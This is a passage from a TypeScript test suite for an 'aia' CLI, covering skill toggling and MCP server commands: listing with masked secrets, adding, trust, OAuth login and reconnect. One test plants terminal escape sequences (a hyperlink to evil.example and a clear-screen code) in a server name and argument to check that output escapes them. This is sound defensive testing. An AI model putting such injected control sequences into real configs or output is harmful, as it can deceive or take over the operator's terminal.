    const { home, workspace } = await createSkillsWorkspace();
    const workspaceConfig = path.join(workspace, "aia.config.jsonc");
    const userConfig = path.join(home, ".aia", "config.jsonc");
    await fs.writeFile(workspaceConfig, '{ "configVersion": 1, "skills": { "disabled": ["release-notes"] } }', "utf8");
    await fs.writeFile(userConfig, '{ "configVersion": 1, "skills": { "disabled": ["release-notes"] } }', "utf8");

    const typo = createCaptureStreams();
    await runCliWithStubbedEndpoint(["skills", "disable", "relase-notes", "--cwd", workspace], typo.streams, {
      userHomeDirectory: home
    });
    expect(typo.getStdout()).toContain('No skill named "relase-notes" is found');
    // A new entry goes to ~/.aia/config.jsonc, which exists here.
    expect(typo.getStdout()).toContain(`Disabled "relase-notes" in ${userConfig}.`);

    const enabling = createCaptureStreams();
    await runCliWithStubbedEndpoint(["skills", "enable", "release-notes", "--cwd", workspace], enabling.streams, {
      userHomeDirectory: home
    });
    // skills.disabled adds up across files, so a list left in either one would keep it off.
    expect(enabling.getStdout()).toContain(
      `Enabled "release-notes": removed it from skills.disabled in ${userConfig} and ${workspaceConfig}.`
    );
    expect((await listJson(home, workspace)).skills.find((skill) => skill.name === "release-notes")?.enabled).toBe(
      true
    );
  });

  test("a skill disabled in any config file stays disabled", async () => {
    // A workspace config's own list used to replace the user's, quietly
    // turning back on a skill the operator had disabled.
    const { home, workspace } = await createSkillsWorkspace();
    await fs.writeFile(
      path.join(home, ".aia", "config.jsonc"),
      '{ "configVersion": 1, "skills": { "disabled": ["release-notes"] } }',
      "utf8"
    );
    await fs.writeFile(
      path.join(workspace, "aia.config.jsonc"),
      '{ "configVersion": 1, "skills": { "disabled": ["some-other-skill"] } }',
      "utf8"
    );

    expect((await listJson(home, workspace)).skills.find((skill) => skill.name === "release-notes")?.enabled).toBe(
      false
    );
  });

  test("rejects an unknown subcommand and a missing name", async () => {
    const unknown = createCaptureStreams();
    expect(await runCliWithStubbedEndpoint(["skills", "remove", "x"], unknown.streams, {})).toBe(1);
    expect(unknown.getStderr()).toContain("Unknown skills subcommand: remove");

    const missing = createCaptureStreams();
    expect(await runCliWithStubbedEndpoint(["skills", "disable"], missing.streams, {})).toBe(1);
    expect(missing.getStderr()).toContain("Usage: aia skills disable <name>");

    // A bare `aia skills` is a request for help, not an error.
    const bare = createCaptureStreams();
    expect(await runCliWithStubbedEndpoint(["skills"], bare.streams, {})).toBe(0);
    expect(bare.getStdout()).toContain("aia skills list");
  });
});

describe("aia mcp", () => {
  const mcpRoots: string[] = [];
  afterEach(async () => {
    await Promise.all(mcpRoots.splice(0).map((root) => fs.rm(root, { force: true, recursive: true })));
  });

  async function createMcpWorkspace(
    userConfig: string
  ): Promise<{ configPath: string; home: string; workspace: string }> {
    const root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "aiagent-cli-mcp-")));
    mcpRoots.push(root);
    const home = path.join(root, "home");
    const workspace = path.join(root, "workspace");
    await fs.mkdir(path.join(home, ".aia"), { recursive: true });
    await fs.mkdir(path.join(workspace, ".git"), { recursive: true });
    const configPath = path.join(home, ".aia", "aia.config.jsonc");
    await fs.writeFile(configPath, userConfig, "utf8");
    return { configPath, home, workspace };
  }

  async function run(argv: string[], home: string) {
    const capture = createCaptureStreams();
    const exitCode = await runCliWithStubbedEndpoint(argv, capture.streams, { userHomeDirectory: home });
    return { exitCode, stderr: capture.getStderr(), stdout: capture.getStdout() };
  }

  test("list and get show each server with its secrets masked, in text and JSON", async () => {
    const { home, workspace } = await createMcpWorkspace(
      JSON.stringify({
        configVersion: 1,
        mcp: {
          servers: {
            docs: {
              enabled: true,
              headers: { Authorization: "Bearer super-secret" },
              required: false,
              tags: [],
              type: "streamable-http",
              url: "https://docs.example.com/mcp"
            },
            local: {
              args: ["server.js"],
              command: "node",
              enabled: true,
              env: { API_KEY: "hunter2", REF: { id: "MY_TOKEN", source: "env" } },
              required: false,
              stderr: "pipe",
              tags: [],
              type: "stdio"
            },
            // A preregistered OAuth client: its secret is as secret as a header.
            signin: {
              enabled: true,
              oauth: { clientId: "aia-client", clientSecret: "oauth-shh" },
              required: false,
              tags: [],
              type: "streamable-http",
              url: "https://signin.example.com/mcp"
            }
          }
        }
      })
    );

    const listed = await run(["mcp", "list", "--cwd", workspace], home);
    expect(listed.exitCode, listed.stderr).toBe(0);
    expect(listed.stdout).toContain("docs  [streamable-http, enabled]  https://docs.example.com/mcp");
    expect(listed.stdout).toContain("auth: Authorization header");
    expect(listed.stdout).toContain("local  [stdio, enabled]  node server.js");

    type ListedJson = {
      auth?: string;
      name: string;
      server: Record<string, Record<string, string>>;
    };
    const json = await run(["mcp", "list", "--json", "--cwd", workspace], home);
    for (const secret of ["super-secret", "hunter2", "oauth-shh"]) {
      expect(json.stdout).not.toContain(secret);
    }
    const parsed = JSON.parse(json.stdout) as ListedJson[];
    const local = parsed.find((entry) => entry.name === "local");
    expect(local?.server.env).toEqual({
      API_KEY: "*****",
      REF: "secret env:MY_TOKEN"
    });
    // A stdio server has no sign-in, so it has no `auth` (it used to be "-").
    expect(local).not.toHaveProperty("auth");
    expect(parsed.find((entry) => entry.name === "docs")?.auth).toBe("Authorization header");
    expect(parsed.find((entry) => entry.name === "signin")).toMatchObject({
      auth: "not signed in",
      server: { oauth: { clientId: "aia-client", clientSecret: "*****" } }
    });

    const one = await run(["mcp", "get", "docs", "--cwd", workspace], home);
    expect(one.stdout).toContain('headers: {"Authorization":"*****"}');
    expect(one.stdout).not.toContain("super-secret");

    // `get --json` prints the one server, masked the same way.
    const oneJson = await run(["mcp", "get", "signin", "--json", "--cwd", workspace], home);
    expect(oneJson.exitCode, oneJson.stderr).toBe(0);
    expect(oneJson.stdout).not.toContain("oauth-shh");
    expect(JSON.parse(oneJson.stdout)).toMatchObject({
      name: "signin",
      server: { oauth: { clientId: "aia-client", clientSecret: "*****" }, url: "https://signin.example.com/mcp" }
    });
    const oneText = await run(["mcp", "get", "signin", "--cwd", workspace], home);
    expect(oneText.stdout).toContain('oauth: {"clientId":"aia-client","clientSecret":"*****"}');
    expect(oneText.stdout).not.toContain("oauth-shh");
  });

  test("a bare aia mcp prints its help and exits 0, as aia voice does", async () => {
    const { home } = await createMcpWorkspace(JSON.stringify({ configVersion: 1 }));
    const bare = await run(["mcp"], home);
    expect(bare.exitCode).toBe(0);
    expect(bare.stdout).toContain("aia mcp list");
    expect(bare.stderr).toBe("");
  });

  test("list prints what a config names so it cannot drive the terminal", async () => {
    const { home, workspace } = await createMcpWorkspace(
      JSON.stringify({
        configVersion: 1,
        mcp: {
          servers: {
            "docs\u001b]8;;https://evil.example\u0007": {
              args: ["\u001b[2J"],
              command: "node",
              enabled: true,
              required: false,
              tags: [],
              type: "stdio"
            }
          }
        }
      })
    );

    const listed = await run(["mcp", "list", "--cwd", workspace], home);
    expect(listed.exitCode, listed.stderr).toBe(0);
    expect(listed.stdout).not.toContain("\u001b");
    expect(listed.stdout).toContain("docs\\x1b]8;;https://evil.example\\x07  [stdio, enabled]  node \\x1b[2J");
  });

  test("add writes a server to the user config, keeping its comments, and refuses to replace one without --force", async () => {
    const { configPath, home, workspace } = await createMcpWorkspace('{\n  // mine\n  "configVersion": 1\n}\n');

    const added = await run(
      [
        "mcp",
        "add",
        "tools",
        "--env",
        "LEVEL=debug",
        "--pass-env",
        "GITHUB_TOKEN",
        "--cwd",
        workspace,
        "--",
        "node",
        "srv.js",
        "--port",
        "1"
      ],
      home
    );
    expect(added.exitCode, added.stderr).toBe(0);
    expect(added.stdout).toContain(`Added MCP server "tools" in ${configPath}.`);
    const written = await fs.readFile(configPath, "utf8");
    expect(written).toContain("// mine");
    expect(JSON.parse(written.replace(/\/\/.*\n/gu, "\n")).mcp.servers.tools).toMatchObject({
      args: ["srv.js", "--port", "1"],
      command: "node",
      env: { LEVEL: "debug" },
      passEnv: ["GITHUB_TOKEN"],
      type: "stdio"
    });

    const again = await run(["mcp", "add", "tools", "--url", "https://x.example.com/mcp", "--cwd", workspace], home);
    expect(again.exitCode).toBe(1);
    expect(again.stderr).toContain("Use --force to replace it");

    const forced = await run(
      ["mcp", "add", "tools", "--url", "https://x.example.com/mcp", "--force", "--cwd", workspace],
      home
    );
    expect(forced.stdout).toContain('Replaced MCP server "tools"');
    expect(forced.stdout).toContain("aia mcp login tools");

    const removed = await run(["mcp", "remove", "tools", "--cwd", workspace], home);
    expect(removed.stdout).toContain(`Removed MCP server "tools" from ${configPath}.`);
    expect(await fs.readFile(configPath, "utf8")).toContain("// mine");
  });

  test("add --workspace keeps the workspace config's trust when it was the operator's, and says when it was not", async () => {
    const { home, workspace } = await createMcpWorkspace('{ "configVersion": 1 }');

    // No workspace config yet: the operator's own, so the result is trusted.
    const first = await run(["mcp", "add", "one", "--workspace", "--cwd", workspace, "--", "node", "one.js"], home);
    expect(first.exitCode, first.stderr).toBe(0);
    expect(first.stdout).not.toContain("not trusted");

    // A config that arrived with the checkout, untrusted, stays untrusted.
    await fs.writeFile(
      path.join(workspace, "aia.config.jsonc"),
      JSON.stringify({
        mcp: {
          servers: {
            theirs: { args: [], command: "node", enabled: true, required: false, tags: [], type: "stdio" }
          }
        }
      }),
      "utf8"
    );
    const second = await run(["mcp", "add", "two", "--workspace", "--cwd", workspace, "--", "node", "two.js"], home);
    expect(second.exitCode, second.stderr).toBe(0);
    expect(second.stdout).toContain(
      "The workspace config is not trusted, so this server starts only after aia trust --grant."
    );
  });

  test("add checks the name and the entry before writing anything", async () => {
    const { configPath, home, workspace } = await createMcpWorkspace('{ "configVersion": 1 }');
    const badName = await run(["mcp", "add", "x".repeat(129), "--cwd", workspace, "--", "node"], home);
    expect(badName.exitCode).toBe(1);
    expect(badName.stderr).toContain("is not a usable server name");
    const controlName = await run(["mcp", "add", "bad\u001bname", "--cwd", workspace, "--", "node"], home);
    expect(controlName.exitCode).toBe(1);
    expect(controlName.stderr).toContain('"bad\\x1bname" is not a usable server name');

    const both = await run(
      ["mcp", "add", "x", "--url", "https://x.example.com", "--cwd", workspace, "--", "node"],
      home
    );
    expect(both.stderr).toContain("Give exactly one of");

    const unknownTemplate = await run(["mcp", "add", "x", "--template", "nope", "--cwd", workspace], home);
    expect(unknownTemplate.stderr).toContain('No MCP server template "nope"');
    expect(await fs.readFile(configPath, "utf8")).toBe('{ "configVersion": 1 }');
  });

  test("add and remove edit the user file that defines a server, and a new one goes to config.jsonc", async () => {
    // Finding: with the server in config.jsonc, `add` wrote a second entry to
    // aia.config.jsonc, and the merge sent config.jsonc's API key to the new URL.
    const { home, workspace } = await createMcpWorkspace('{ "configVersion": 1 }');
    const baseConfig = path.join(home, ".aia", "config.jsonc");
    await fs.writeFile(
      baseConfig,
      JSON.stringify({
        configVersion: 1,
        mcp: {
          servers: {
            base: {
              enabled: true,
              headers: { "x-api-key": "secret-a" },
              required: false,
              tags: [],
              type: "streamable-http",
              url: "https://a.example.com/mcp"
            }
          }
        }
      }),
      "utf8"
    );

    const refused = await run(["mcp", "add", "base", "--url", "https://b.example.com/mcp", "--cwd", workspace], home);
    expect(refused.exitCode).toBe(1);
    expect(refused.stderr).toContain(`${baseConfig} already defines the MCP server "base". Use --force to replace it.`);

    const forced = await run(
      ["mcp", "add", "base", "--url", "https://b.example.com/mcp", "--force", "--cwd", workspace],
      home
    );
    expect(forced.stdout).toContain(`Replaced MCP server "base" in ${baseConfig}.`);
    const replaced = JSON.parse(await fs.readFile(baseConfig, "utf8")) as {
      mcp: { servers: Record<string, { headers: Record<string, string>; url: string }> };
    };
    // Replaced whole: the old entry's key does not go with the new URL.
    expect(replaced.mcp.servers.base).toMatchObject({ headers: {}, url: "https://b.example.com/mcp" });

    const added = await run(["mcp", "add", "fresh", "--cwd", workspace, "--", "node", "srv.js"], home);
    expect(added.stdout).toContain(`Added MCP server "fresh" in ${baseConfig}.`);

    const removed = await run(["mcp", "remove", "base", "--cwd", workspace], home);
    expect(removed.stdout).toContain(`Removed MCP server "base" from ${baseConfig}.`);
  });

  test("add refuses a name the other scope defines, since the two entries would be merged", async () => {
    const { configPath, home, workspace } = await createMcpWorkspace(
      JSON.stringify({
        configVersion: 1,
        mcp: {
          servers: {
            docs: { args: [], command: "node", enabled: true, required: false, stderr: "pipe", tags: [], type: "stdio" }
          }
        }
      })
    );
    const refused = await run(
      ["mcp", "add", "docs", "--workspace", "--force", "--cwd", workspace, "--", "node", "other.js"],
      home
    );
    expect(refused.exitCode).toBe(1);
    expect(refused.stderr).toContain(`The MCP server "docs" is also defined in ${configPath}`);
    await expect(fs.access(path.join(workspace, "aia.config.jsonc"))).rejects.toThrow();
  });

  test("writes a new config file readable only by its owner, and a symlinked one through its link", async () => {
    const { home, workspace } = await createMcpWorkspace('{ "configVersion": 1 }');
    const added = await run(["mcp", "add", "local", "--workspace", "--cwd", workspace, "--", "node", "srv.js"], home);
    expect(added.exitCode, added.stderr).toBe(0);
    expect((await fs.stat(path.join(workspace, "aia.config.jsonc"))).mode & 0o777).toBe(0o600);

    // ~/.aia/aia.config.jsonc kept in a dotfiles folder and linked in.
    const userConfig = path.join(home, ".aia", "aia.config.jsonc");
    const dotfile = path.join(home, "dotfiles-aia.jsonc");
    await fs.rename(userConfig, dotfile);
    await fs.symlink(dotfile, userConfig);
    const linked = await run(["mcp", "add", "linked", "--cwd", workspace, "--", "node", "srv.js"], home);
    expect(linked.exitCode, linked.stderr).toBe(0);
    expect((await fs.lstat(userConfig)).isSymbolicLink()).toBe(true);
    expect(await fs.readFile(dotfile, "utf8")).toContain('"linked"');
  });

  test("logout forgets a saved sign-in; reconnect with no session running says so", async () => {
    // Nothing listens on the configured gateway either (a free port), so the
    // test never dials a server the developer happens to be running.
    const { home, workspace } = await createMcpWorkspace(
      JSON.stringify({ configVersion: 1, gateway: { port: await findFreePort() } })
    );
    const loggedOut = await run(["mcp", "logout", "docs", "--cwd", workspace], home);
    expect(loggedOut.stdout).toContain('No saved sign-in for "docs".');

    const reconnect = await run(["mcp", "reconnect", "docs", "--cwd", workspace], home);
    expect(reconnect.exitCode).toBe(0);
    expect(reconnect.stdout).toContain("No aia session is running in this workspace");
  });

  test("login signs in through the browser, or through a pasted callback URL, and logout forgets it", async () => {
    const serverCleanups: Array<() => Promise<void>> = [];
    try {
      const server = await startProtectedMcpServer(serverCleanups);
      const { home, workspace } = await createMcpWorkspace(
        JSON.stringify({
          configVersion: 1,
          mcp: {
            servers: {
              protected: {
                enabled: true,
                headers: {},
                required: false,
                tags: [],
                type: "streamable-http",
                url: server.url
              }
            }
          }
        })
      );

      const viaBrowser = createCaptureStreams();
      expect(
        await runCliWithStubbedEndpoint(["mcp", "login", "protected", "--cwd", workspace], viaBrowser.streams, {
          mcp: { openBrowser: headlessBrowser },
          userHomeDirectory: home
        })
      ).toBe(0);
      expect(viaBrowser.getStdout()).toContain('Opening your browser to sign in to "protected"');
      expect(viaBrowser.getStdout()).toContain('Signed in to "protected".');

      const listed = createCaptureStreams();
      await runCliWithStubbedEndpoint(["mcp", "list", "--cwd", workspace], listed.streams, { userHomeDirectory: home });
      expect(listed.getStdout()).toContain("auth: signed in (OAuth)");

      const loggedOut = createCaptureStreams();
      await runCliWithStubbedEndpoint(["mcp", "logout", "protected", "--cwd", workspace], loggedOut.streams, {
        userHomeDirectory: home
      });
      expect(loggedOut.getStdout()).toContain('Removed the saved sign-in for "protected".');

      // No browser here: the operator pastes where the browser ended up. A
      // stray Enter, a wrong line and an earlier attempt's address come
      // first; each used to use up the only paste, leaving the login to wait
      // out its timeout.
      let pastedFrom: (value: string) => void = () => undefined;
      const pasted = new Promise<string>((resolve) => {
        pastedFrom = resolve;
      });
      async function* typed() {
        yield "";
        yield "not the address";
        const address = new URL(await pasted);
        address.searchParams.set("state", "from-an-earlier-attempt");
        yield address.toString();
        yield await pasted;
      }
      const viaPaste = createCaptureStreams();
      const exitCode = runCliWithStubbedEndpoint(
        ["mcp", "login", "protected", "--no-browser", "--cwd", workspace],
        {
          stderr: viaPaste.streams.stderr,
          stdout: {
            write: (value: string) => {
              const match = /(http:\/\/127\.0\.0\.1:\d+\/authorize\S*)/u.exec(value);
              if (match) {
                void fetch(match[1]!, { redirect: "manual" }).then((response) =>
                  pastedFrom(response.headers.get("location")!)
                );
              }
              return viaPaste.streams.stdout.write(value);
            }
          }
        },
        { mcp: { readLines: typed }, userHomeDirectory: home }
      );
      expect(await exitCode).toBe(0);
      expect(viaPaste.getStdout()).toContain("Then paste the address the browser ends on here");
      expect(viaPaste.getStdout()).toContain('Signed in to "protected".');
      const ignored = viaPaste.getStderr().match(/That is not the address this sign-in ends on/gu) ?? [];
      expect(ignored).toHaveLength(2);
      expect(viaPaste.getStderr()).toMatch(/it starts with http:\/\/127\.0\.0\.1:\d+\/callback\//u);
    } finally {
      for (const cleanup of serverCleanups.reverse()) {
        await cleanup();
      }
    }
  });

  test("login sends a header given as a secret reference, resolved", async () => {
    const serverCleanups: Array<() => Promise<void>> = [];
    const previous = process.env.AIA_TEST_MCP_API_KEY;
    process.env.AIA_TEST_MCP_API_KEY = "key-from-env";
    try {
      const server = await startProtectedMcpServer(serverCleanups);
      const { home, workspace } = await createMcpWorkspace(
        JSON.stringify({
          configVersion: 1,
          mcp: {
            servers: {
              protected: {
                enabled: true,
                headers: { "x-api-key": "${AIA_TEST_MCP_API_KEY}" },
                required: false,
                tags: [],
                type: "streamable-http",
                url: server.url
              }
            }
          }
        })
      );

      const capture = createCaptureStreams();
      expect(
        await runCliWithStubbedEndpoint(["mcp", "login", "protected", "--cwd", workspace], capture.streams, {
          mcp: { openBrowser: headlessBrowser },
          userHomeDirectory: home
        })
      ).toBe(0);
      // It used to be read from the unresolved config, and dropped.
      expect(server.state.apiKeys.length).toBeGreaterThan(0);
      expect(new Set(server.state.apiKeys)).toEqual(new Set(["key-from-env"]));
    } finally {
      if (previous === undefined) {
        delete process.env.AIA_TEST_MCP_API_KEY;
      } else {
        process.env.AIA_TEST_MCP_API_KEY = previous;
      }
      for (const cleanup of serverCleanups.reverse()) {
        await cleanup();
      }
    }
  });

  test("reconnect asks each running session of the workspace, over its published gateway", async () => {
    const { home, workspace } = await createMcpWorkspace('{ "configVersion": 1 }');
    const stateRoot = path.join(workspace, ".aia");
    await fs.mkdir(attachEndpointsDirectory(stateRoot), { recursive: true });
    await fs.writeFile(
      attachEndpointFilePath(stateRoot),
      JSON.stringify({
        createdAt: new Date().toISOString(),
        pid: process.pid,
        token: "t",
        url: "ws://127.0.0.1:1/gateway"
      })
    );
    const dialed: string[] = [];
    const createWebSocket = (url: string) => {
      dialed.push(url);
      const listeners = new Map<string, Array<(data?: unknown) => void>>();
      const emit = (event: string, data?: unknown) => listeners.get(event)?.forEach((listener) => listener(data));
      setTimeout(() => emit("open"), 0);
      return {
        close: () => undefined,
        on: (event: string, listener: (data?: unknown) => void) => {
          listeners.set(event, [...(listeners.get(event) ?? []), listener]);
        },
        readyState: 1,
        send: (data: string) => {
          const request = JSON.parse(data) as { id: string; topic: string };
          setTimeout(
            () =>
              emit(
                "message",
                JSON.stringify({
                  createdAt: new Date().toISOString(),
                  id: "response.1",
                  metadata: {},
                  ok: true,
                  payload: {
                    server: {
                      capabilities: { tools: 1 },
                      serverName: "docs",
                      state: "connected",
                      tools: [],
                      transport: "stdio"
                    }
                  },
                  requestId: request.id,
                  topic: request.topic
                })
              ),
            0
          );
        }
      };
    };

    const capture = createCaptureStreams();
    const exitCode = await runCliWithStubbedEndpoint(
      ["mcp", "reconnect", "docs", "--cwd", workspace],
      capture.streams,
      {
        mcp: { createWebSocket: createWebSocket as never },
        userHomeDirectory: home
      }
    );

    expect(exitCode, capture.getStderr()).toBe(0);
    expect(dialed).toEqual(["ws://127.0.0.1:1/gateway?token=t"]);
    expect(capture.getStdout()).toContain(`Session ${process.pid}: docs is connected.`);
  });

  // A fake gateway WebSocket: answers mcp.reconnect, or fails to connect.
  function fakeGatewaySockets(failing: (url: string) => boolean = () => false) {
    const dialed: string[] = [];
    const createWebSocket = (url: string) => {
      dialed.push(url);
      const listeners = new Map<string, Array<(data?: unknown) => void>>();
      const emit = (event: string, data?: unknown) => listeners.get(event)?.forEach((listener) => listener(data));
      setTimeout(() => (failing(url) ? emit("error", new Error("socket hang up")) : emit("open")), 0);
      return {
        close: () => undefined,
        on: (event: string, listener: (data?: unknown) => void) => {
          listeners.set(event, [...(listeners.get(event) ?? []), listener]);
        },
        readyState: 1,
        send: (data: string) => {
          const request = JSON.parse(data) as { id: string; topic: string };
          setTimeout(
            () =>
              emit(
                "message",
                JSON.stringify({
                  createdAt: new Date().toISOString(),
                  id: `response.${request.id}`,
                  metadata: {},
                  ok: true,
                  payload: {
                    server: {
                      capabilities: { tools: 1 },
                      serverName: "docs",
                      state: "connected",
                      tools: [],
                      transport: "stdio"
                    }
                  },
                  requestId: request.id,
                  topic: request.topic
                })
              ),
            0
          );
        }
      };
    };
    return { createWebSocket, dialed };
  }

  test("reconnect asks the configured gateway when no session published one, with its token resolved", async () => {
    const previous = process.env.AIA_TEST_GATEWAY_TOKEN;
    process.env.AIA_TEST_GATEWAY_TOKEN = "configured-token";
    try {
      const { home, workspace } = await createMcpWorkspace(
        JSON.stringify({
          configVersion: 1,
          gateway: { auth: { token: "${AIA_TEST_GATEWAY_TOKEN}" }, hostname: "0.0.0.0", port: 4999 }
        })
      );
      const sockets = fakeGatewaySockets();
      const capture = createCaptureStreams();
      const exitCode = await runCliWithStubbedEndpoint(
        ["mcp", "reconnect", "docs", "--cwd", workspace],
        capture.streams,
        {
          mcp: { createWebSocket: sockets.createWebSocket as never },
          userHomeDirectory: home
        }
      );

      expect(exitCode, capture.getStderr()).toBe(0);
      // `aia serve` listens where the config says; its token was a secret reference.
      expect(sockets.dialed).toHaveLength(1);
      expect(sockets.dialed[0]).toMatch(/^ws:\/\/127\.0\.0\.1:4999\/.*\?token=configured-token$/u);
      expect(capture.getStdout()).toContain("The gateway: docs is connected.");
    } finally {
      if (previous === undefined) {
        delete process.env.AIA_TEST_GATEWAY_TOKEN;
      } else {
        process.env.AIA_TEST_GATEWAY_TOKEN = previous;
      }
    }
  });

  test("reconnect asks every session at once, and fails when any one could not be asked", async () => {
    const { home, workspace } = await createMcpWorkspace('{ "configVersion": 1 }');
    const stateRoot = path.join(workspace, ".aia");
    await fs.mkdir(attachEndpointsDirectory(stateRoot), { recursive: true });
    // Two live processes: this one and its parent.
    for (const [pid, port] of [
      [process.pid, 1],
      [process.ppid, 2]
    ] as const) {
      await fs.writeFile(
        attachEndpointFilePath(stateRoot, pid),
        JSON.stringify({
          createdAt: new Date().toISOString(),
          pid,
          token: `t${port}`,
          url: `ws://127.0.0.1:${port}/gateway`
        })
      );
    }
    const sockets = fakeGatewaySockets((url) => url.startsWith("ws://127.0.0.1:2/"));
    const capture = createCaptureStreams();
    const exitCode = await runCliWithStubbedEndpoint(
      ["mcp", "reconnect", "docs", "--cwd", workspace],
      capture.streams,
      {
        mcp: { createWebSocket: sockets.createWebSocket as never },
        userHomeDirectory: home
      }
    );

    expect(sockets.dialed.sort()).toEqual(["ws://127.0.0.1:1/gateway?token=t1", "ws://127.0.0.1:2/gateway?token=t2"]);
    expect(capture.getStdout()).toContain(`Session ${process.pid}: docs is connected.`);
    expect(capture.getStderr()).toContain(`Session ${process.ppid}: socket hang up`);
    // One session reconnected and one did not: a script must hear about it.
    expect(exitCode).toBe(1);
  });

  test("login refuses a stdio server", async () => {
    const { home, workspace } = await createMcpWorkspace(
      JSON.stringify({
        configVersion: 1,
        mcp: {
          servers: {
            local: {
              args: [],
              command: "node",
              enabled: true,
              env: {},
              required: false,
              stderr: "pipe",
              tags: [],
              type: "stdio"
            }
          }
        }
      })
    );
    const result = await run(["mcp", "login", "local", "--cwd", workspace], home);
    expect(result.exitCode).toBe(1);
    expect(result.stderr).toContain("sign-in applies to HTTP servers only");
  });
});

async function findFreePort(): Promise<number> {
  const net = await import("node:net");
  return await new Promise<number>((resolve, reject) => {
    const server = net.createServer();
    server.once("error", reject);
    server.listen(0, "127.0.0.1", () => {
      const { port } = server.address() as { port: number };
      server.close(() => resolve(port));
    });
  });
}
